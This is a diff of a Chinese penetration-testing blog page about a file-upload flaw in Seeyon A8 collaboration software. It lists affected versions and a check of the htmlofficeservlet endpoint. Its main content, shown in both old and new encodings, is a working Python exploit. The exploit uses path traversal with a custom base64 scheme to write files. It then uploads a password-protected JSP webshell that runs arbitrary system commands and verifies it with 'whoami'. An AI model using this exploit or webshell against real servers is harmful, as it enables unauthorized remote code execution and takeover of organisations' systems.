@@ -82,24 +82,17 @@
     [<a href="/categories/Pentest">Pentest</a>](<a href="/tags/getshell">getshell</a>)
 </div>
 
-      <div>
-
-<h3 id="0x00-影响版本">0x00 影响版本</h3>
-
+      <div><h3 id="0x00-影响版本">0x00 影响版本</h3>
 <ul>
 <li>致远A8-V5协同管理软件 V6.1sp1</li>
 <li>致远A8+协同管理软件 V7.0、V7.0sp1、V7.0sp2、V7.0sp3</li>
 <li>致远A8+协同管理软件 V7.1</li>
 </ul>
-
 <h3 id="0x01-查看接口看是否存在漏洞">0x01 查看接口看是否存在漏洞</h3>
-
 <p>如果查看 <code>&quot;seeyon/htmlofficeservlet&quot;</code> 接口，出现如下内容则表示存在漏洞
-<img src="/img/post/Xnip2019-06-29_09-43-32.png" alt="70" /></p>
-
-<h3 id="0x02-poc-exp">0x02 POC &amp; EXP</h3>
-
-<pre><code>#!/usr/bin/env python
+<img src="/img/post/Xnip2019-06-29_09-43-32.png" alt="70"></p>
+<h3 id="0x02-poc--exp">0x02 POC &amp; EXP</h3>
+<pre tabindex="0"><code>#!/usr/bin/env python
 # -*- coding: utf-8 -*-
 
 import time
@@ -108,82 +101,82 @@ import string
 import requests
 
 info = {
-    &quot;name&quot;: &quot;致远 A8 可 getshell&quot;,
-    &quot;author&quot;: &quot;reber&quot;,
-    &quot;version&quot;: &quot;致远A8-V5协同管理软件V6.1sp1、致远A8+协同管理软件V7.0、V7.0sp1、V7.0sp2、V7.0sp3、V7.1&quot;,
-    &quot;type&quot;: &quot;file_upload&quot;,
-    &quot;level&quot;: &quot;high&quot;,
-    &quot;result&quot;: &quot;&quot;,
-    &quot;status&quot;: False,
-    &quot;references&quot;: &quot;&lt;url&gt;&quot;,
-    &quot;desc&quot;: &quot;&lt;vul describtion&gt;&quot;,
+    &#34;name&#34;: &#34;致远 A8 可 getshell&#34;,
+    &#34;author&#34;: &#34;reber&#34;,
+    &#34;version&#34;: &#34;致远A8-V5协同管理软件V6.1sp1、致远A8+协同管理软件V7.0、V7.0sp1、V7.0sp2、V7.0sp3、V7.1&#34;,
+    &#34;type&#34;: &#34;file_upload&#34;,
+    &#34;level&#34;: &#34;high&#34;,
+    &#34;result&#34;: &#34;&#34;,
+    &#34;status&#34;: False,
+    &#34;references&#34;: &#34;&lt;url&gt;&#34;,
+    &#34;desc&#34;: &#34;&lt;vul describtion&gt;&#34;,
 }
 
 def assign(service, arg):
-   if service == 'seeyon':
+   if service == &#39;seeyon&#39;:
        return True, arg
 
 def encode(origin_bytes):
-    &quot;&quot;&quot;
+    &#34;&#34;&#34;
     重构 base64 编码函数
-    &quot;&quot;&quot;
+    &#34;&#34;&#34;
     # 将每一位bytes转换为二进制字符串
-    base64_charset = &quot;gx74KW1roM9qwzPFVOBLSlYaeyncdNbI=JfUCQRHtj2+Z05vshXi3GAEuT/m8Dpk6&quot;
-    base64_bytes = ['{:0&gt;8}'.format(bin(ord(b)).replace('0b', '')) for b in origin_bytes]
+    base64_charset = &#34;gx74KW1roM9qwzPFVOBLSlYaeyncdNbI=JfUCQRHtj2+Z05vshXi3GAEuT/m8Dpk6&#34;
+    base64_bytes = [&#39;{:0&gt;8}&#39;.format(bin(ord(b)).replace(&#39;0b&#39;, &#39;&#39;)) for b in origin_bytes]
 
-    resp = ''
+    resp = &#39;&#39;
     nums = len(base64_bytes) // 3
     remain = len(base64_bytes) % 3
 
     integral_part = base64_bytes[0:3 * nums]
     while integral_part:
         # 取三个字节，以每6比特，转换为4个整数
-        tmp_unit = ''.join(integral_part[0:3])
+        tmp_unit = &#39;&#39;.join(integral_part[0:3])
         tmp_unit = [int(tmp_unit[x: x + 6], 2) for x in [0, 6, 12, 18]]
         # 取对应base64字符
-        resp += ''.join([base64_charset[i] for i in tmp_unit])
+        resp += &#39;&#39;.join([base64_charset[i] for i in tmp_unit])
         integral_part = integral_part[3:]
 
     if remain:
         # 补齐三个字节，每个字节补充 0000 0000
-        remain_part = ''.join(base64_bytes[3 * nums:]) + (3 - remain) * '0' * 8
+        remain_part = &#39;&#39;.join(base64_bytes[3 * nums:]) + (3 - remain) * &#39;0&#39; * 8
         # 取三个字节，以每6比特，转换为4个整数
         # 剩余1字节可构造2个base64字符，补充==；剩余2字节可构造3个base64字符，补充=
         tmp_unit = [int(remain_part[x: x + 6], 2) for x in [0, 6, 12, 18]][:remain + 1]
-        resp += ''.join([base64_charset[i] for i in tmp_unit]) + (3 - remain) * '='
+        resp += &#39;&#39;.join([base64_charset[i] for i in tmp_unit]) + (3 - remain) * &#39;=&#39;
 
     return resp
 
 def verify(arg):
-    url = arg + &quot;/seeyon/htmlofficeservlet&quot;
-    tmp_random_str = ''.join(random.sample(string.letters+string.digits, 10))
+    url = arg + &#34;/seeyon/htmlofficeservlet&#34;
+    tmp_random_str = &#39;&#39;.join(random.sample(string.letters+string.digits, 10))
     headers = {
-        &quot;Pragma&quot;: &quot;no-cache&quot;,
-        &quot;Cache-Control&quot;: &quot;no-cache&quot;,
-        &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;,
-        &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36&quot;,
-        &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3&quot;,
-        &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9&quot;,
-        &quot;Connection&quot;: &quot;close&quot;,
-        &quot;Content-Length&quot;: &quot;429&quot;,
+        &#34;Pragma&#34;: &#34;no-cache&#34;,
+        &#34;Cache-Control&#34;: &#34;no-cache&#34;,
+        &#34;Upgrade-Insecure-Requests&#34;: &#34;1&#34;,
+        &#34;User-Agent&#34;: &#34;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36&#34;,
+        &#34;Accept&#34;: &#34;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3&#34;,
+        &#34;Accept-Language&#34;: &#34;zh-CN,zh;q=0.9&#34;,
+        &#34;Connection&#34;: &#34;close&#34;,
+        &#34;Content-Length&#34;: &#34;429&#34;,
     }
-    file_name = encode('..\\..\\..\\ApacheJetspeed\\webapps\\seeyon\\shXi3GAEuT.txt')
-    payload = &quot;DBSTEP V3.0     355             0               10             DBSTEP=OKMLlKlV\r\n&quot;
-    payload += &quot;OPTION=S3WYOSWLBSGr\r\n&quot;
-    payload += &quot;currentUserId=zUCTwigsziCAPLesw4gsw4oEwV66\r\n&quot;
-    payload += &quot;CREATEDATE=wUghPB3szB3Xwg66\r\n&quot;
-    payload += &quot;RECORDID=qLSGw4SXzLeGw4V3wUw3zUoXwid6\r\n&quot;
-    payload += &quot;originalFileId=wV66\r\n&quot;
-    payload += &quot;originalCreateDate=wUghPB3szB3Xwg66\r\n&quot;
-    payload += &quot;FILENAME={}\r\n&quot;.format(file_name)
-    payload += &quot;needReadFile=yRWZdAS6\r\n&quot;
-    payload += &quot;originalCreateDate=wLSGP4oEzLKAz4=iz=66\r\n&quot;
-    payload += &quot;a{}&quot;.format(tmp_random_str)
+    file_name = encode(&#39;..\\..\\..\\ApacheJetspeed\\webapps\\seeyon\\shXi3GAEuT.txt&#39;)
+    payload = &#34;DBSTEP V3.0     355             0               10             DBSTEP=OKMLlKlV\r\n&#34;
+    payload += &#34;OPTION=S3WYOSWLBSGr\r\n&#34;
+    payload += &#34;currentUserId=zUCTwigsziCAPLesw4gsw4oEwV66\r\n&#34;
+    payload += &#34;CREATEDATE=wUghPB3szB3Xwg66\r\n&#34;
+    payload += &#34;RECORDID=qLSGw4SXzLeGw4V3wUw3zUoXwid6\r\n&#34;
+    payload += &#34;originalFileId=wV66\r\n&#34;
+    payload += &#34;originalCreateDate=wUghPB3szB3Xwg66\r\n&#34;
+    payload += &#34;FILENAME={}\r\n&#34;.format(file_name)
+    payload += &#34;needReadFile=yRWZdAS6\r\n&#34;
+    payload += &#34;originalCreateDate=wLSGP4oEzLKAz4=iz=66\r\n&#34;
+    payload += &#34;a{}&#34;.format(tmp_random_str)
 
     try:
         requests.post(url=url, data=payload, headers=headers)
         
-        upfile_url = arg+&quot;/seeyon/shXi3GAEuT.txt&quot;
+        upfile_url = arg+&#34;/seeyon/shXi3GAEuT.txt&#34;
         time.sleep(2)
         resp = requests.get(url=upfile_url)
         code = resp.status_code
@@ -193,45 +186,41 @@ def verify(arg):
         pass
     else:
         if code==200 and tmp_random_str[1:] in content:
-            info['status'] = True
-            info['result'] = &quot;{} 可直接getshell, 测试文件路径: {}&quot;.format(arg,upfile_url)
+            info[&#39;status&#39;] = True
+            info[&#39;result&#39;] = &#34;{} 可直接getshell, 测试文件路径: {}&#34;.format(arg,upfile_url)
 
 def attack(arg):
-    url = arg + &quot;/seeyon/htmlofficeservlet&quot;
+    url = arg + &#34;/seeyon/htmlofficeservlet&#34;
     headers = {
-        &quot;Pragma&quot;: &quot;no-cache&quot;,
-        &quot;Cache-Control&quot;: &quot;no-cache&quot;,
-        &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;,
-        &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36&quot;,
-        &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3&quot;,
-        &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9&quot;,
-        &quot;Connection&quot;: &quot;close&quot;,
-        &quot;Content-Length&quot;: &quot;429&quot;,
+        &#34;Pragma&#34;: &#34;no-cache&#34;,
+        &#34;Cache-Control&#34;: &#34;no-cache&#34;,
+        &#34;Upgrade-Insecure-Requests&#34;: &#34;1&#34;,
+        &#34;User-Agent&#34;: &#34;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36&#34;,
+        &#34;Accept&#34;: &#34;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3&#34;,
+        &#34;Accept-Language&#34;: &#34;zh-CN,zh;q=0.9&#34;,
+        &#34;Connection&#34;: &#34;close&#34;,
+        &#34;Content-Length&#34;: &#34;429&#34;,
     }
-    file_name = encode('..\\..\\..\\ApacheJetspeed\\webapps\\seeyon\\qwer960452.jsp')
-    payload = &quot;&quot;&quot;DBSTEP V3.0     355             0               666             DBSTEP=OKMLlKlV\r
+    file_name = encode(&#39;..\\..\\..\\ApacheJetspeed\\webapps\\seeyon\\qwer960452.jsp&#39;)
+    payload = &#34;&#34;&#34;DBSTEP V3.0     355             0               666             DBSTEP=OKMLlKlV\r
 OPTION=S3WYOSWLBSGr\r
 currentUserId=zUCTwigsziCAPLesw4gsw4oEwV66\r
 CREATEDATE=wUghPB3szB3Xwg66\r
 RECORDID=qLSGw4SXzLeGw4V3wUw3zUoXwid6\r
 originalFileId=wV66\r
 originalCreateDate=wUghPB3szB3Xwg66\r
-FILENAME=&quot;&quot;&quot;+file_name+&quot;&quot;&quot;\r
+FILENAME=&#34;&#34;&#34;+file_name+&#34;&#34;&#34;\r
 needReadFile=yRWZdAS6\r
 originalCreateDate=wLSGP4oEzLKAz4=iz=66\r
-&lt;%@ page language=&quot;java&quot; import=&quot;java.util.*,java.io.*&quot; pageEncoding=&quot;UTF-8&quot;%&gt;&lt;%!public static String excuteCmd(String c) {StringBuilder line = new StringBuilder();try {Process pro = Runtime.getRuntime().exec(c);BufferedReader buf = new BufferedReader(new InputStreamReader(pro.getInputStream()));String temp = null;while ((temp = buf.readLine()) != null) {line.append(temp+&quot;\\n&quot;);}buf.close();} catch (Exception e) {line.append(e.getMessage());}return line.toString();} %&gt;&lt;%if(&quot;el38A9485&quot;.equals(request.getParameter(&quot;pwd&quot;))&amp;&amp;!&quot;&quot;.equals(request.getParameter(&quot;cmd&quot;))){out.println(&quot;&lt;pre&gt;&quot;+excuteCmd(request.getParameter(&quot;cmd&quot;)) + &quot;&lt;/pre&gt;&quot;);}else{out.println(&quot;:-)&quot;);}%&gt;6e4f045d4b8506bf492ada7e3390d7ce&quot;&quot;&quot;
+&lt;%@ page language=&#34;java&#34; import=&#34;java.util.*,java.io.*&#34; pageEncoding=&#34;UTF-8&#34;%&gt;&lt;%!public static String excuteCmd(String c) {StringBuilder line = new StringBuilder();try {Process pro = Runtime.getRuntime().exec(c);BufferedReader buf = new BufferedReader(new InputStreamReader(pro.getInputStream()));String temp = null;while ((temp = buf.readLine()) != null) {line.append(temp+&#34;\\n&#34;);}buf.close();} catch (Exception e) {line.append(e.getMessage());}return line.toString();} %&gt;&lt;%if(&#34;el38A9485&#34;.equals(request.getParameter(&#34;pwd&#34;))&amp;&amp;!&#34;&#34;.equals(request.getParameter(&#34;cmd&#34;))){out.println(&#34;&lt;pre&gt;&#34;+excuteCmd(request.getParameter(&#34;cmd&#34;)) + &#34;&lt;/pre&gt;&#34;);}else{out.println(&#34;:-)&#34;);}%&gt;6e4f045d4b8506bf492ada7e3390d7ce&#34;&#34;&#34;
 
     requests.post(url=url, data=payload, headers=headers)
-    resp = requests.get(arg+'/seeyon/qwer960452.jsp?pwd=el38A9485&amp;cmd=cmd+/c+echo+ekwjkjrwre')
-    if 'ekwjkjrwre' in resp.text:
-        print &quot;{} 的 webshell 路径: {}&quot;.format(arg,arg+'/seeyon/qwer960452.jsp?pwd=el38A9485&amp;cmd=cmd+/c+whoami')
-</code></pre>
-
-<h3 id="0x03-执行得到结果">0x03 执行得到结果</h3>
-
-<!-- ![](/img/post/Xnip2019-06-29_09-53-16.png) -->
-
-<p><img src="/img/post/Xnip2019-06-29_09-57-11.png" alt="80" /></p>
+    resp = requests.get(arg+&#39;/seeyon/qwer960452.jsp?pwd=el38A9485&amp;cmd=cmd+/c+echo+ekwjkjrwre&#39;)
+    if &#39;ekwjkjrwre&#39; in resp.text:
+        print &#34;{} 的 webshell 路径: {}&#34;.format(arg,arg+&#39;/seeyon/qwer960452.jsp?pwd=el38A9485&amp;cmd=cmd+/c+whoami&#39;)
+</code></pre><h3 id="0x03-执行得到结果">0x03 执行得到结果</h3>
+<!-- raw HTML omitted -->
+<p><img src="/img/post/Xnip2019-06-29_09-57-11.png" alt="80"></p>
 </div>
     </article>
   </main>
